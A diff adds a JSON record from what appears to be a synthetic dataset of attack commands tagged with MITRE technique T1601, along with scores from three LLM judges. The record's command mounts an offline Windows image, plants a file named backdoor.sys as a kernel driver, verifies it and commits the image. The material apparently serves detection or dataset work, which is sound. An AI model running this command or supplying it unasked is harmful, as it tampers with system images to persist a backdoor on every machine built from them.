@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1601",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "dism /Mount-Wim /WimFile:C:\\Images\\install.wim /Index:1 /MountDir:C:\\Mount\\Install; Copy-Item C:\\Payloads\\backdoor.sys C:\\Mount\\Install\\Windows\\System32\\drivers\\backdoor.sys -Force; fc /b C:\\Payloads\\backdoor.sys C:\\Mount\\Install\\Windows\\System32\\drivers\\backdoor.sys; dism /Unmount-Wim /MountDir:C:\\Mount\\Install /Commit; Get-FileHash C:\\Images\\install.wim -Algorithm SHA256; fc /b C:\\Images\\install_clean.wim C:\\Images\\install.wim",
+  "explanation": "Injects a kernel driver into an offline Windows image, confirms the implant by binary comparison within the mount, and validates the WIM\u2019s post-modification integrity.",
+  "rationale_steps": [
+    "Mount the target offline image for servicing.",
+    "Plant a malicious driver into the drivers directory of the image.",
+    "Use fc to confirm the injected file matches the attacker\u2019s payload.",
+    "Commit the image and verify modification via hash and fc vs baseline."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1601-7053c5d6-eb719488",
+  "source_prompt_hash": "7053c5d6",
+  "timestamp_utc": "2025-09-30T04:53:44.701470Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper command separators, valid DISM and PowerShell syntax, balanced quotes, and correct parameter formats for all operations.",
+        "semantic_score": 5,
+        "semantic_justification": "The command sequence perfectly aligns with T1601 by mounting a Windows image, injecting a backdoor driver, verifying the implant, committing changes, and comparing the modified image against the original to validate the modification.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-02T17:53:21.168465Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct command separators, valid flags, and proper syntax for all included DISM, PowerShell, and native Windows commands.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command sequence correctly leverages appropriate tools to modify a WIM image and confirms changes, the stated 'Privilege: None' directly contradicts the administrative privileges required for DISM and writing to system directories, rendering the sequence operationally implausible as described.",
+        "combined_score": 4.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T17:53:38.189927Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command chain is well-formed with valid flags and semicolon separators, but in PowerShell 'fc' should be called as fc.exe to avoid alias conflicts.",
+        "semantic_score": 4,
+        "semantic_justification": "It mounts and modifies a WIM to implant a driver and commits plus validates changes consistent with T1601, but requires administrative rights, a pre-existing mount directory, and fc.exe (and likely offline registry edits for auto-loading) for full realism.",
+        "combined_score": 4.0,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T17:54:14.034967Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.333,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
